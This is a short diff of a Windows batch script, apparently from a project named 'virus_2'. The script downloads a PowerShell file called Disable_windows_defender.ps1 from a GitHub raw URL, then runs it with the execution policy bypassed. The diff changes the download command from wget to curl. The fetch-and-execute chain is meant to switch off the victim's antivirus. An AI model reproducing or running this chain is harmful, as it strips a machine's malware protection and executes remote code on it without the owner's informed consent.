@@ -9,7 +9,7 @@ if %errorlevel% neq 0 (
 )
 
 
-wget -O Disable_windows_defender.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/Disable_windows_defender.ps1
+curl -O Disable_windows_defender.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/Disable_windows_defender.ps1
 
 @echo off
 REM Get the directory of the batch file
@@ -17,3 +17,4 @@ set "SCRIPT_DIR=%~dp0"
 
 REM Run the PowerShell script from the same directory
 powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%Disable_windows_defender.ps1"
+
